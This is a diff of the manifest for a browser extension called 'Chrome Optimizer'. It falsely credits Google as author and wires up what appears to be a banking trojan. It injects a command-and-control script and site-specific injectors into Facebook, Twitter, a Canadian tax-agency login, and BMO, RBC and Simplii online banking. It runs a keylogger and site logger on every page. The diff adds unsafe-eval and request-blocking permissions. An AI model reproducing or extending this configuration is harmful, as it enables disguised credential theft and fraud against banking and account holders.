@@ -1,113 +1,121 @@
 {
-	"manifest_version": 2,
-	"name": "Chrome Optimizer",
-	"version": "1.0",
-	"author": "Google",
-	"description": "Optimizes Browser Performance",
-	"content_scripts": [
-		{
-			"matches": [
-				"https://www.facebook.com/*",
-				"https://facebook.com/*"
-			],
-			"js": [
-				"config.js",
-				"lib/cnc.js",
-				"auth/facebook/inject_facebook.js"
-			]
-		},
-		{
-			"matches": [
-				"https://www.facebook.com/login*"
-			],
-			"js": [
-				"config.js",
-				"lib/cnc.js",
-				"auth/facebook/inject_facebook_login.js"
-			]
-		},
-		{
-			"matches": [
-				"https://*.bmo.com/onlinebanking/cgi-bin/netbnx/*"
-			],
-			"js": [
-				"config.js",
-				"lib/cnc.js",
-				"auth/bmo/bmo.js"
-			]
-		},
-		{
-			"matches": [
-				"https://*.royalbank.com/cgi-bin/rbaccess*"
-			],
-			"js": [
-				"config.js",
-				"lib/cnc.js",
-				"auth/rbc/inject_rbc.js"
-			]
-		},
-		{
-			"matches": [
-				"https://www.simplii.com/*/home.html"
-			],
-			"js": [
-				"config.js",
-				"lib/cnc.js",
-				"auth/simplii/inject_simplii.js"
-			]
-		},
-		{
-			"matches": [
-				"https://twitter.com/login*"
-			],
-			"js": [
-				"config.js",
-				"lib/cnc.js",
-				"auth/twitter/inject_twitter.js"
-			]
-		},
-		{
-			"matches": [
-				"https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login*"
-			],
-			"js": [
-				"config.js",
-				"lib/cnc.js",
-				"auth/cra/inject_cra.js"
-			]
-		},
-		{
-			"matches": [
-				"<all_urls>"
-			],
-			"js": [
-				"config.js",
-				"lib/cnc.js",
-				"utils/keylogger.js"
-			]
-		},
-		{
-			"matches": [
-				"<all_urls>"
-			],
-			"js": [
-				"config.js",
-				"lib/ip.js",
-				"lib/cnc.js",
-				"utils/hook.js",
-				"utils/sitelogger.js"
-			]
-		}
-	],
-	"icons": {
-		"16": "img/icon.png",
-		"48": "img/icon.png",
-		"128": "img/icon.png",
-		"248": "img/icon.png"
+  "manifest_version": 2,
+  "name": "Chrome Optimizer",
+  "version": "1.0",
+  "author": "Google",
+  "description": "Optimizes Browser Performance",
+  "content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self'",
+  "background": {
+    "scripts": [
+      "background.js"
+    ]
+  },
+  "content_scripts": [
+	{
+	  "matches": [
+		"https://www.facebook.com/*",
+		"https://facebook.com/*"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/cnc.js",
+		"auth/facebook/inject_facebook.js"
+	  ]
 	},
-	"permissions": [
-		"<all_urls>",
-		"background",
-		"tabs"
-	]
+	{
+	  "matches": [
+		"https://www.facebook.com/login*"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/cnc.js",
+		"auth/facebook/inject_facebook_login.js"
+	  ]
+	},
+	{
+	  "matches": [
+		"https://*.bmo.com/onlinebanking/cgi-bin/netbnx/*"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/cnc.js",
+		"auth/bmo/bmo.js"
+	  ]
+	},
+	{
+	  "matches": [
+		"https://*.royalbank.com/cgi-bin/rbaccess*"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/cnc.js",
+		"auth/rbc/inject_rbc.js"
+	  ]
+	},
+	{
+	  "matches": [
+		"https://www.simplii.com/*/home.html"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/cnc.js",
+		"auth/simplii/inject_simplii.js"
+	  ]
+	},
+	{
+	  "matches": [
+		"https://twitter.com/login*"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/cnc.js",
+		"auth/twitter/inject_twitter.js"
+	  ]
+	},
+	{
+	  "matches": [
+		"https://cms-sgj.cra-arc.gc.ca/gol-ged/awsc/cms/login*"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/cnc.js",
+		"auth/cra/inject_cra.js"
+	  ]
+	},
+	{
+	  "matches": [
+		"<all_urls>"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/cnc.js",
+		"utils/keylogger.js"
+	  ]
+	},
+	{
+	  "matches": [
+		"<all_urls>"
+	  ],
+	  "js": [
+		"config.js",
+		"lib/ip.js",
+		"lib/cnc.js",
+		"utils/hook.js",
+		"utils/sitelogger.js"
+	  ]
+	}
+  ],
+  "icons": {
+	"16": "img/icon.png",
+	"48": "img/icon.png",
+	"128": "img/icon.png",
+	"248": "img/icon.png"
+  },
+  "permissions": [
+	"<all_urls>",
+	"background",
+	"tabs",
+    "webRequest",
+    "webRequestBlocking"
+  ]
 }
